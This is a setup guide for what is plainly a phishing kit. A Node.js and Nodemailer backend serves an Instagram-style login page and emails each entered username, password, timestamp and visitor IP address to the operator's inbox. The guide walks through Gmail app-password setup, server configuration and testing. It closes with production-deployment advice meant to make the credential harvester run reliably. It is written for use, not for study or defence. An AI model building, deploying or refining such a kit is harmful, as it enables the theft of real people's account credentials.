# Nodemailer Setup Guide

This guide will help you set up a Node.js backend with Nodemailer to receive Instagram login credentials via email.

## Prerequisites

1. **Node.js** installed on your computer
2. **Gmail account** (or other email provider)
3. **App Password** for your email account

## Step 1: Install Dependencies

Open your terminal/command prompt in the project folder and run:

```bash
npm install
```

This will install all required packages (Express, Nodemailer, CORS, etc.).

## Step 2: Configure Gmail App Password

### For Gmail Users:

1. **Enable 2-Factor Authentication** on your Gmail account
2. **Generate App Password**:
   - Go to Google Account settings
   - Security → 2-Step Verification → App passwords
   - Select "Mail" and "Other (Custom name)"
   - Name it "Instagram Login Bot"
   - Copy the 16-character password

### For Other Email Providers:

- **Outlook/Hotmail**: Use your regular password or generate an app password
- **Yahoo**: Enable 2FA and generate app-specific password
- **Custom SMTP**: Update the transporter configuration in `server.js`

## Step 3: Update Email Configuration

Open `server.js` and update these lines:

```javascript
const transporter = nodemailer.createTransporter({
  service: "gmail", // Change to 'outlook', 'yahoo', etc.
  auth: {
    user: "your-email@gmail.com", // Replace with your email
    pass: "your-16-char-app-password", // Replace with your app password
  },
});
```

Also update the email addresses in the mailOptions:

```javascript
const mailOptions = {
  from: "your-email@gmail.com", // Replace with your email
  to: "your-email@gmail.com", // Replace with your email
  // ... rest of the configuration
};
```

## Step 4: Start the Server

Run the server:

```bash
npm start
```

Or for development with auto-restart:

```bash
npm run dev
```

You should see:

```
🚀 Server running on http://localhost:3000
📧 Email notifications will be sent to your configured email address
```

## Step 5: Test the Setup

1. Open your browser and go to `http://localhost:3000`
2. Enter any username and password
3. Click "Log In"
4. Check your email - you should receive a beautifully formatted email with the credentials

## Email Features

The email you'll receive includes:

- ✅ **Beautiful HTML formatting** with Instagram colors
- ✅ **Username and password** clearly displayed
- ✅ **Timestamp** of when the login was attempted
- ✅ **IP address** of the user (for security tracking)
- ✅ **Professional design** with icons and styling

## Troubleshooting

### Common Issues:

1. **"Invalid login" error**:

   - Check your Gmail app password is correct
   - Make sure 2FA is enabled on your Gmail account

2. **"Connection timeout"**:

   - Check your internet connection
   - Try using a different email provider

3. **"Authentication failed"**:

   - Verify your email and app password
   - Make sure you're using an app password, not your regular password

4. **Port already in use**:
   - Change the PORT in `server.js` (line 8)
   - Or kill the process using the port

### For Different Email Providers:

**Outlook/Hotmail:**

```javascript
service: 'outlook',
auth: {
    user: 'your-email@outlook.com',
    pass: 'your-password'
}
```

**Yahoo:**

```javascript
service: 'yahoo',
auth: {
    user: 'your-email@yahoo.com',
    pass: 'your-app-password'
}
```

**Custom SMTP:**

```javascript
host: 'smtp.your-provider.com',
port: 587,
secure: false,
auth: {
    user: 'your-email@domain.com',
    pass: 'your-password'
}
```

## Security Notes

⚠️ **Important Security Considerations:**

1. **Never commit your email credentials** to version control
2. **Use environment variables** for production:
   ```javascript
   user: process.env.EMAIL_USER,
   pass: process.env.EMAIL_PASS
   ```
3. **Enable HTTPS** for production use
4. **Rate limiting** should be implemented for production
5. **Input validation** should be added for security

## Production Deployment

For production deployment, consider:

- Using environment variables for credentials
- Adding rate limiting
- Implementing HTTPS
- Using a process manager like PM2
- Setting up proper logging

## Support

If you encounter any issues:

1. Check the console output for error messages
2. Verify your email configuration
3. Test with a simple email first
4. Check your spam folder

The system is now ready to send beautiful, formatted emails with login credentials directly to your inbox! 🎉
